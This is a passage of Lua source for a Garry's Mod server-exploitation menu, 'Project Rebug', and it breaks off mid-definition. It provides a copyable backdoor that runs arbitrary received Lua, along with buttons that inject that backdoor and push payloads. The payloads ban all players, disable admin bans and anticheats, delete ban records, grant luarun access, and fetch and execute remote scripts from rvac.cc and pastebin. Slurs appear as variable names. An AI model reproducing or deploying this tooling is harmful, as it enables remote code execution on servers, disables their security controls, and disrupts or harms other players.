			local target2 = vgui.Create("DButton", rebug.PlayerSelector)
			target2:SetSize(40, 20)
			target2:SetPos(55, 23)
			target2:SetText("None")
			target2:SetTextColor(Color(255, 255, 255, 255))

			target2.Paint = function(panel, w, h)
				surface.SetDrawColor(100, 100, 100, 255)
				surface.DrawOutlinedRect(0, 0, w, h)
				surface.SetDrawColor(0, 0, 50, 155)
				surface.DrawRect(0, 0, w, h)
			end

			target2.DoClick = function()
				table.Empty(plytab)
				rebug.Store(addr, plytab)
			end

			local target3 = vgui.Create("DButton", rebug.PlayerSelector)
			target3:SetSize(40, 20)
			target3:SetPos(100, 23)
			target3:SetText("Me")
			target3:SetTextColor(Color(255, 255, 255, 255))

			target3.Paint = function(panel, w, h)
				surface.SetDrawColor(100, 100, 100, 255)
				surface.DrawOutlinedRect(0, 0, w, h)
				surface.SetDrawColor(0, 0, 50, 155)
				surface.DrawRect(0, 0, w, h)
			end

			target3.DoClick = function()
				table.Empty(plytab)
				table.insert(plytab, LocalPlayer())
				rebug.Store(addr, plytab)
			end

			local target4 = vgui.Create("DTextEntry", rebug.PlayerSelector)
			target4:SetPos(145, 23)
			target4:SetSize(95, 20)
			target4:SetText("")

			target4.OnChange = function(self)
				local nam = self:GetValue()
				local namtab = string.Explode(", ", nam)
				table.Empty(plytab)

				for _, pl in pairs(player.GetAll()) do
					for _, s in pairs(namtab) do
						if string.find(string.lower(pl:Nick()), s) then
							table.insert(plytab, pl)
						end
					end
				end

				rebug.Store(addr, plytab)
			end

			for k, v in pairs(player.GetAll()) do
				local plypanel2 = vgui.Create("DPanel")
				plypanel2:SetPos(0, 0)
				plypanel2:SetSize(200, 25)
				local teamcol = team.GetColor(v:Team())

				plypanel2.Paint = function(s, w, h)
					if not v:IsValid() then return end
					surface.SetDrawColor(Color(30, 30, 30, 245))
					surface.DrawRect(0, 0, w, h)
					surface.SetDrawColor(teamcol)
					surface.DrawRect(0, h - 3, w, 3)
					surface.SetDrawColor(Color(55, 55, 55, 245))
					surface.DrawOutlinedRect(0, 0, w, h)

					if table.HasValue(plytab, v) then
						surface.SetDrawColor(Color(55, 255, 55, 245))
					end

					surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
				end

				local plyname = vgui.Create("DLabel", plypanel2)
				plyname:SetPos(10, 5)
				plyname:SetFont("Trebuchet18")
				local tcol = Color(255, 255, 255)

				if v == LocalPlayer() then
					tcol = Color(155, 155, 255)
				end

				plyname:SetColor(tcol)
				plyname:SetText(v:Nick())
				plyname:SetSize(180, 15)
				local faggot = vgui.Create("DButton", plypanel2)
				faggot:SetSize(plypanel2:GetWide(), plypanel2:GetTall())
				faggot:SetPos(0, 0)
				faggot:SetText("")
				faggot.Paint = function(panel, w, h) return end

				faggot.DoClick = function()
					if table.HasValue(plytab, v) then
						table.RemoveByValue(plytab, v)
					else
						table.insert(plytab, v)
					end
					rebug.Store(addr, plytab)
				end
				Plist11:AddItem(plypanel2)
			end
		end

		function rebug.MakeTextInputButton(parent, x, y, btext, default, addr)
			if not parent:IsValid() then return end
			local hostframe = vgui.Create("DPanel", parent)
			hostframe:SetPos(x, y)
			hostframe.Paint = function(self, w, h)
				surface.SetDrawColor(Color(60, 60, 60, 200))
				surface.DrawRect(0, 0, w, h)
				surface.SetDrawColor(Color(60, 60, 60))
				surface.SetMaterial(downgrad)
				surface.DrawTexturedRect(0, 0, w, h / 2)
				surface.SetDrawColor(Color(100, 100, 100, 255))
				surface.DrawOutlinedRect(0, 0, w, h)
			end

			local tttt = vgui.Create("DLabel", hostframe)
			tttt:SetPos(5, 5)
			tttt:SetText(btext)
			tttt:SizeToContents()
			local tentry = vgui.Create("DTextEntry", hostframe)
			tentry:SetPos(10 + tttt:GetWide(), 2)
			tentry:SetSize(130, 20)
			tentry:SetText(rebug.GetStored(addr, default))

			tentry.OnChange = function(self)
				rebug.Store(addr, self:GetValue())
			end
			hostframe:SetSize(13 + tttt:GetWide() + tentry:GetWide(), 24)
			return hostframe:GetWide(), hostframe:GetTall()
		end

		function rebug.MakeNumberInputButton(parent, x, y, btext, default, min, max, addr)
			if not parent:IsValid() then return end
			local hostframe = vgui.Create("DPanel", parent)
			hostframe:SetPos(x, y)

			hostframe.Paint = function(self, w, h)
				surface.SetDrawColor(Color(60, 60, 60, 200))
				surface.DrawRect(0, 0, w, h)
				surface.SetDrawColor(Color(60, 60, 60))
				surface.SetMaterial(downgrad)
				surface.DrawTexturedRect(0, 0, w, h / 2)
				surface.SetDrawColor(Color(100, 100, 100, 255))
				surface.DrawOutlinedRect(0, 0, w, h)
			end

			local tttt = vgui.Create("DLabel", hostframe)
			tttt:SetPos(5, 5)
			tttt:SetText(btext)
			tttt:SizeToContents()
			local wangmeoff = vgui.Create("DNumberWang", hostframe)
			wangmeoff:SetPos(10 + tttt:GetWide(), 2)
			wangmeoff:SetSize(45, 20)
			wangmeoff:SetDecimals(2)
			wangmeoff:SetValue(rebug.GetStored(addr, default))

			wangmeoff.OnValueChanged = function(self, val)
				rebug.Store(addr, self:GetValue())
			end

			hostframe:SetSize(13 + tttt:GetWide() + wangmeoff:GetWide(), 24)

			return hostframe:GetWide(), hostframe:GetTall()
		end

		rebug.Menu = vgui.Create("DFrame")
		rebug.Menu:SetSize(600, 450)
		rebug.Menu:SetTitle("Server Exploitation( Backdoor NOT required )")
		rebug.Menu:Center()
		rebug.Menu:MakePopup()
		rebug.Menu.gay = table.Count(rebug.sploits)

		rebug.Menu.Paint = function(s, w, h)
			surface.SetDrawColor(Color(30, 30, 30))
			surface.DrawRect(0, 0, w, h)
			surface.SetDrawColor(35, 21, 21)
			surface.SetMaterial(upgrad)
			surface.SetDrawColor(o_color2)
			surface.SetMaterial(downgrad)
			surface.SetDrawColor(o_color2)
			surface.SetDrawColor(35, 35, 35, 255)
			surface.DrawOutlinedRect(0, 0, w, h)
		end


		local Plist11 = vgui.Create("DPanelList", rebug.Menu)
		Plist11:SetSize(550, rebug.Menu:GetTall() - 35)
		Plist11:SetPadding(5)
		Plist11:SetSpacing(5)
		Plist11:EnableHorizontal( false )
		Plist11:EnableVerticalScrollbar( true )
		Plist11:SetPos(6, 30)
		Plist11:SetName("")

		local function CreateSploitPanel(name, t)
			if not Plist11 then return end
			local cmdp = vgui.Create("DPanel")
			cmdp:SetSize(Plist11:GetWide(), 70)
			cmdp.Cmd = name
			cmdp.Desc = t.desc

			cmdp.Paint = function(s, w, h)
				surface.SetDrawColor(Color(50, 50, 50, 245))
				surface.DrawRect(0, 0, w, h)
				surface.SetDrawColor(severitycols[t.severity])
				surface.DrawOutlinedRect(0, 0, w, h)
				surface.DrawLine(0, 24, w, 24)
				draw.DrawText(cmdp.Cmd, "DermaDefault", 10, 5, Color(255, 255, 255))
				draw.DrawText(cmdp.Desc, "DermaDefault", 10, 28, Color(205, 205, 255, 100))
			end

			local x = 10

			for _, tab in ipairs(t.functions) do
				if tab.typ == "func" then
					x = (x + 5) + rebug.MakeFunctionButton(cmdp, x, 42, tab.name, tab.func)
				elseif tab.typ == "players" then
					x = (x + 5) + rebug.MakePlayerSelectionButton(cmdp, x, 42, tab.addr)
				elseif tab.typ == "string" then
					x = (x + 5) + rebug.MakeTextInputButton(cmdp, x, 42, tab.name, tab.default, tab.addr)

					if not rebug.IsStored(tab.addr) then
						rebug.Store(tab.addr, tab.default)
					end
				elseif tab.typ == "float" then
					x = (x + 5) + rebug.MakeNumberInputButton(cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr)

					if not rebug.IsStored(tab.addr) then
						rebug.Store(tab.addr, tab.default)
					end
				end
			end

			Plist11:AddItem(cmdp)
		end

		for k, v in pairs(rebug.sploits) do
			if v.scan() then
				CreateSploitPanel(k, v)
			end
		end
	end

        local exploitationP = vgui.Create("DButton", VoidPlate)
        exploitationP:SetFont("Trebuchet18")
        exploitationP:SetText("Exploits")
        exploitationP:SetTextColor(Color(255, 255, 255, 255))
        exploitationP:SetPos(693, 591)
        exploitationP:SetSize(180, 40)

        exploitationP.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        exploitationP.DoClick = function()
		surface.PlaySound("buttons/button18.wav")
            exploitation()
            Void:SetVisible(false)
        end

/*
*	Panels 1 rcon / cmd
*/
        local List1 = vgui.Create("DPanelList", VoidPlate)
        List1:SetPos(6, 9)
        List1:SetSize(876, 117)
        List1:SetPadding(5)
        List1:SetSpacing(5)
        List1:EnableHorizontal(false)
        List1:EnableVerticalScrollbar(true)
        List1:SetName("")

        List1.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local detour = vgui.Create("DTextEntry", List1)
        detour:SetPos(467, 9)
        detour:SetSize(400, 100)
        detour:SetTextColor(Color(255, 255, 255, 255))
        detour:SetFont("Trebuchet18")

        detour.Paint = function(self, w, h)
            surface.SetDrawColor(Color(33, 33, 33))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
            self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
        end

        detour.OnEnter = function(self)
            surface.PlaySound("buttons/button18.wav")
            noob.Notify("Targeting NetString: '" .. detour:GetValue() .. "'")
            channel = self:GetValue()
        end

        local shitbox = vgui.Create("DTextEntry", List1)
        shitbox:SetPos(10, 9)
        shitbox:SetSize(416, 64)
        shitbox:SetTextColor(Color(255, 255, 255, 255))
        shitbox:SetFont("Trebuchet18")
        shitbox:SetMultiline(true)

        shitbox.Paint = function(self, w, h)
            surface.SetDrawColor(Color(33, 33, 33))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
            self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
        end

        local rconcmd = vgui.Create("DButton", List1)
        rconcmd:SetFont("Trebuchet18")
        rconcmd:SetText("Rcon CMD")
        rconcmd:SetTextColor(Color(255, 255, 255, 255))
        rconcmd:SetPos(10, 79)
        rconcmd:SetSize(200, 30)

        rconcmd.Paint = function(self, w, h)
            surface.SetDrawColor(Color(200, 24, 24))
            surface.SetDrawColor(40, 40, 40)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        rconcmd.DoClick = function()
            surface.PlaySound("buttons/button18.wav")
            local GetEntry = shitbox:GetValue()
            net.Start(channel)
            net.WriteString(GetEntry)
            net.WriteBit(false)
            net.SendToServer()
        end

        local luacmd = vgui.Create("DButton", List1)
        luacmd:SetFont("Trebuchet18")
        luacmd:SetText("Lua CMD")
        luacmd:SetTextColor(Color(255, 255, 255, 255))
        luacmd:SetPos(226, 79)
        luacmd:SetSize(200, 30)

        luacmd.Paint = function(self, w, h)
            surface.SetDrawColor(Color(200, 24, 24))
            surface.SetDrawColor(40, 40, 40)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        luacmd.DoClick = function()
            local GetEntry = shitbox:GetValue()
            net.Start(channel)
            net.WriteString(GetEntry)
            net.WriteBit(1)
            net.SendToServer()
        end

/*
*	Panels 2 : Backdoors
*/
        local List2 = vgui.Create("DPanelList", VoidPlate)
        List2:SetPos(19, 155)
        List2:SetSize(180, 430)
        List2:SetPadding(2)
        List2:SetSpacing(2)
        List2:EnableHorizontal(false)
        List2:EnableVerticalScrollbar(true)
        List2:SetName("")

        List2.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local item1 = vgui.Create("DPanelList", List2)
        item1:SetPos(12, 8)
        item1:SetSize(170, 420)
        item1:SetPadding(2)
        item1:SetSpacing(2)
        item1:EnableHorizontal(false)
        item1:EnableVerticalScrollbar(true)
        item1:SetName("")

        item1.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetDrawColor(35, 35, 35, 0)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local Bar1 = vgui.Create("DScrollPanel", item1)
        Bar1:Dock(FILL)
        local sBar1 = Bar1:GetVBar()
        function sBar1:Paint()
        end
        function sBar1.btnUp:Paint()
        end
        function sBar1.btnDown:Paint()
        end
        function sBar1.btnGrip:Paint()
        end

        local copy = vgui.Create("DButton", VoidPlate)
        copy:SetFont("Trebuchet18")
        copy:SetText("Copy Backdoor")
        copy:SetTextColor(Color(255, 255, 255, 255))
        copy:SetPos(19, 591)
        copy:SetSize(180, 40)

        copy.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        copy.DoClick = function()
            surface.PlaySound("buttons/button18.wav")
            rprint(" Copied! LuaRun or place inside addon")
            SetClipboardText('util.AddNetworkString("REBUG")net.Receive("REBUG",function()RunString(net.ReadString())end)')
        end

        local bhop = vgui.Create("DButton", VoidPlate)
        bhop:SetFont("Trebuchet18")
        bhop:SetText("Bunny Hop")
        bhop:SetTextColor(Color(255, 255, 255, 255))
        bhop:SetPos(19, 637)
        bhop:SetSize(180, 40)

        bhop.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        bhop.DoClick = function()
            surface.PlaySound("buttons/button18.wav")
			OP_Bhop()
        end
		
        -- Backdoor 1
        rebug.AddButton("@Inject SendLua Interface", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

				util.AddNetworkString('REBUG')

				net.Receive('REBUG', function(length, ply)
					local netString = net.ReadString()
					local bit = net.ReadBit()

					if bit == 1 then
						RunString(netString)
					else
						game.ConsoleCommand(netString .. '\n')
					end
				end)

			]])
        end)

        rebug.AddButton("Artillery Server Strike", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
				if not bombstrike then
					hook.Add("Think", "lulz_bombstrike", function()
					local explode = ents.Create("env_explosion")
					local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))
					local trc = {}
					trc.start = ps
					trc.endpos = ps + Vector(0, 0, -99999)
					local tr = util.TraceLine(trc)
					if not tr.Hit then return end
					explode:SetPos(tr.HitPos)
					explode:Spawn()
					explode:SetKeyValue("iMagnitude", "400")
					explode:Fire("Explode", 0, 0)
				end)

				bombstrike = true
			else
				hook.Remove("Think", "lulz_bombstrike")
				bombstrike = false
			end
			
			]])
        end)

        rebug.AddButton("Announce centre screen", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Set Custom Text", "Set Text", "", function(str)
                noob.PostLua("for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, \"" .. str .. "\") end")
            end)
        end)

        rebug.AddButton("Broken Glass Symphony", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
				if not timer.Exists("A true masterpiece") then
					timer.Create("A true masterpiece", 0.2, 0, function()
						for _, p in pairs(player.GetAll()) do
						p:EmitSound("physics/glass/glass_largesheet_break" .. math.random(1, 3) .. ".wav", 100, math.random(40, 180))
					end
				end)
			else
				timer.Remove("A true masterpiece")
			end
			
			]])
        end)

        rebug.AddButton("Double Or Nothing", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Set win chance", "1-100", "", function(str)
                noob.PostLua("BDON_CONFIG.doubleChance =" .. str)
            end)
        end)

		rebug.AddButton("Blue ATM Interest", Bar1, function()
			surface.PlaySound("buttons/button18.wav")
			Derma_StringRequest("Blue ATM Interest", "How much money interest makes every 15min", "", function(str)
                noob.PostLua("BATM.MaxInterest =" .. str)
            end)
        end)

        rebug.AddButton("Bitminers2 Value", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Bitminer2 Amount Value", "Set how much money bitminer2 makes", "", function(str)
                noob.PostLua("BM2CONFIG.BitcoinValue =" .. str)
            end)
        end)

        rebug.AddButton("Ban All Players", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Ban All Players", "Reason", "", function(text)
                noob.PostLua([[

				local id = ]] .. LocalPlayer():UserID() .. [[
				
					for k, v in next, player.GetAll() do
						if v:UserID() == id then continue end
							v:Ban( 0, false )
							v:Kick( "]] .. tostring(text) .. [[" )
						end

					]])
            end)
        end)

        rebug.AddButton("Break Economy", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			for k,v in pairs(player.GetAll()) do v:addMoney(9999999999) end
			
			]])
        end)

        rebug.AddButton("Custom Job", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
			noob.PostLua([[

			TEAM_]]..noobstr..[[ = DarkRP.createJob("Project Rebug", {
				model = "models/player/skeleton.mdl",
				weapons = {"weapon_stunstick", "unarrest_stick", "m9k_glock", "m9k_dbarrel", "m9k_usas", "m9k_barret_m82", "m9k_svu", "m9k_acr", "m9k_vector", "m9k_m202", "m9k_milkormgl", "lockpick", "pro_lockpick", "staff_lockpick"},
				command = "]]..noobstr..[[",
				description = "A fucking gamer",
				max = 1,
				customCheck = function(ply) return ply:SteamID() == "]]..ply:SteamID()..[[" end,
				CustomCheckFailMsg = "This isn't your custom class!",
				color = Color(0, 0, 0, 255),
				salary = 1000000000,
				admin = 0,
				vote = false,
				hasLicense = true,
				category = "Citizens",
				PlayerSpawn = function(ply)
					ply:SetMaxHealth(10000)
					ply:SetHealth(10000)
					ply:SetArmor(10000)
				end,
				})
				timer.Simple(0.2, function() ply:ConCommand("darkrp ]]..noobstr..[[") end)
			]]) rprint('Job Command: /'..noobstr)	
			
			
		end)

        rebug.AddButton("Cleanup Map", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			game.CleanUpMap()
			
			]])
        end)

        rebug.AddButton("Console Jammer", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
				if not (timer.Exists("Block_")) then
					timer.Create("Block_", 0.5, 0, function()
					print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
				end)
			else
				timer.Destroy("Block_")
			end
			
			]])
        end)

        rebug.AddButton("Change Everyone Name", Bar1, function()
            Derma_StringRequest("Set Everyones Name", "Name", "", function(text)
                noob.PostLua([[
				
				local str = "]] .. text .. [["

				for k, v in next, player.GetAll() do
					DarkRP.storeRPName(v, str)
					v:setDarkRPVar("rpname", str)
				end
				
				]])
            end)
        end)

        rebug.AddButton("Change All Model", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Change Everyones Model", "Model Directory", "", function(str)
                noob.PostLua([[
				
				for k, v in pairs(player.GetAll()) do v:SetModel(]]..str..[[) end
				
				]])
            end)
        end)

        rebug.AddButton("Change All Material", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Set Everythings Material", "Material Directory", "", function(str)
                noob.PostLua([[
				
				for k, v in pairs(ents.GetAll()) do v:SetMaterial(]]..str..[[) end
				
				]])
            end)
        end)

        rebug.AddButton("Disable Bans/Kicks", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
				if ULib then
					function ULib.kick(ply, reason, calling_ply)
					end

					function ULib.ban(ply, time, reason, admin)
					end

					function ULib.addBan(steamid, time, reason, name, admin)
					end
				end

				if FAdmin then
					local function no(ply)
					end

					FAdmin.Commands.AddCommand("kick", no)
					FAdmin.Commands.AddCommand("ban", no)
					FAdmin.Commands.AddCommand("jail", no)
					FAdmin.Commands.AddCommand("UnJail", no)
					FAdmin.Commands.AddCommand("ClearDecals", no)
					FAdmin.Commands.AddCommand("StopSounds", no)
					FAdmin.Commands.AddCommand("CleanUp", no)
				end

				local _R = debug.getregistry()

				function _R.Player.Ban(ply, r)
				end

				function _R.Player.Kick(ply, r)
				end

				function game.KickID(id, reason)
				end

				local RCM = RunConsoleCommand

				function RunConsoleCommand(command, ...)
					if command == "addip" then return end
					RCM(command, ...)
				end
			]])
        end)

        rebug.AddButton("Disable SNTE", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			local function Check(func)
				if string.find(debug.getinfo(func).short_src, "snte_source.lua") then
					return true
				else
					return false
				end
			end

			timer.Create("fucksnte", 5, 0, function()
				for k, v in pairs(net.Receivers) do
					if Check(v) then
						net.Receive(k, function(l, ply)
							ply:ChatPrint("LEL")
						end)
					end
				end
			end)
			
			]])
		end)

        rebug.AddButton("Disable gAC", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
				if file.Exists('autorun/glorifiedanticheat.lua', 'LUA') then
					_G.gAC = false
					_G.config = false
					_G.storage = false
				else
					rprint("gAC isn't present!")
				end
			
			]])
        end)

        rebug.AddButton("Disable Exit", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
			
			]])
        end)

        rebug.AddButton("DarkRP Start Cash", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			GM.Config.startingmoney = ]]..str..[[ 
			
			]])
        end)

        rebug.AddButton("Earthquake", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
				if not timer.Exists("earthquake") then
					timer.Create("earthquake", 0.5, 500, function()
						for _, p in pairs(player.GetAll()) do
							p:SetPos(p:GetPos() + Vector(0, 0, 1))
							p:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150)))
							util.ScreenShake(p:GetPos(), 20, 1, 1, 100)
							p:EmitSound("ambient/explosions/exp1.wav", 100, math.random(60, 100))
						end

						for _, e in pairs(ents.GetAll()) do
							if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then
								e:GetPhysicsObject():AddVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150)))
							end
						end
					end)
				else
					timer.Remove("earthquake")
				end
				
				]])
        end)

        rebug.AddButton("EarRape", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			for k,v in pairs(player.GetAll()) do v:EmitSound("npc/stalker/go_alert2a.wav", 100, 100 ) end
			
			]])
        end)

        rebug.AddButton("Enigma Disco", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			http.Fetch("https://rvac.cc/load/b1g.lua", function(b) RunString(b) end )
			
			]])
        end)

        rebug.AddButton("Enigma Disco 2.0", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			http.Fetch("https://rvac.cc/load/xd.lua", function(b) RunString(b) end )
			
			]])
        end)

        rebug.AddButton("Hell Mode", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1', function(b) RunString(b) end )")
			
			]])
        end)

        rebug.AddButton("Ignite Everyone", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Ignite All Players", "Lenght In Seconds", "", function(str)
                noob.PostLua([[
				
				for k, v in pairs(player.GetAll()) do v:Ignite(]]..str..[[) end
				
				]])
            end)
        end)

        rebug.AddButton("Kill Everyone", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			for k,v in pairs(player.GetAll()) do v:Kill() end
			
			]])
        end)

        rebug.AddButton("Luarun Access", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")
			
			]])
        end)

        rebug.AddButton("Launch Players", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			for k, v in pairs(player.GetAll()) do
				v:SetVelocity(v:GetVelocity() + Vector(math.random(1000, 5000), math.random(1000, 5000), math.random(1000, 5000)))
			end
			
			]])
        end)

        rebug.AddButton("LuaRun Code", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("LuaRun String", "String", "", function(text)
                noob.PostLua([[
				
				RunString( ']]..text..[[' )
				
				]])
            end)
        end)

        rebug.AddButton("Rainbow Physgun", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			hook.Add("Think", "rainbowphysgun", function()
				for k, ply in ipairs(player.GetAll()) do
					local col = HSVToColor(CurTime() % 6 * 60, 1, 1)
					ply:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
				end
			end)

			]])
        end)

        rebug.AddButton("Rainbow Chat Spam", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Rainbow Chatspam", "Text", "", function(text)
                noob.PostLua([[
				
					chat = 0

					return {}, chat.AddText(...), net.Start("REBUG"), net.WriteTable({...}), net.Broadcast(), AddTextPly(ply, ...), net.Start("REBUG"), net.WriteTable({...}), net.Send(ply), v, pairs(player.GetAll()), v:SendLua('net.Receive("REBUG", function(len) chat.AddText(unpack(net.ReadTable()))end)'), timer.Create("gotEm", 0.8, 120, function()
						local function ChatPrintRainbow(frequency, str)
							local text = {}

							for i = 1, #str do
								table.insert(text, HSVToColor(i * frequency % 360, 1, 1))
								table.insert(text, string.sub(str, i, i))
							end

							chat.AddText(unpack(text))
						end

						ChatPrintRainbow(10, "]] .. text .. [[")
					end)				
				
				]])
            end)
        end)

        rebug.AddButton("Rainbow HUD", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
				if not rainbowscreen then
					BroadcastLua("hook.Add('HUDPaint', 'rainbowscreen', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 100)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")
					rainbowscreen = true
				else
					BroadcastLua("hook.Remove('HUDPaint', 'rainbowscreen')")
					rainbowscreen = false
				end
			
			]])
        end)

        rebug.AddButton("Rainbow Everything", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

				BroadcastLua([==[ 
                    timer.Create("CP_Gaymod",1,0,function()
                        local mats = Entity(0):GetMaterials()
                        for k,v in pairs(mats) do
                        local r,g,b = ColorRand().r-50, ColorRand().g-50, ColorRand().b-50
                            Material(v):SetVector("$color", Vector(r,g,b))
                        end
                    end)
                ]==])

			]])
            rprint("This may cause frame drop")
        end)

        rebug.AddButton("Remove Bans", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

			if file.Exists("ulib/bans.txt", "DATA") then
				file.Delete("ulib/bans.txt")
			end

			]])
        end)

        rebug.AddButton("Rave Music", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

			BroadcastLua("surface.PlaySound('music/hl1_song25_remix3.mp3')")

			]])
        end)

        rebug.AddButton("Moan Steps", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

				if not moanstep then
					hook.Add("PlayerFootstep", "oooh", function(ply)
						ply:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
					end)

					moanstep = true
				else
					hook.Remove("PlayerFootstep", "oooh")
					moanstep = false
				end

			]])
        end)

        rebug.AddButton("Open URL On Players", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("URL On Players", "URL Link", "", function(str)
                noob.PostLua([==[

				local ply = str
					ply:SendLua([[
					h = vgui.Create("DHTML")
					h:SetSize(ScrW(), ScrH())
					h:OpenURL()
					]])

					]==])
            end)
        end)

        rebug.AddButton("Explode all vehicles", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
				for k, v in pairs(ents.GetAll()) do
					if v:IsVehicle() then
						local explo = ents.Create("env_explosion")
						explo:SetPos(v:GetPos())
						explo:SetKeyValue("iMagnitude", "300")
						explo:Spawn()
						explo:Activate()
						explo:Fire("Explode", "", 0)
					end
				end
			
			]])
        end)

        rebug.AddButton("Print All IP's", Bar1, function()
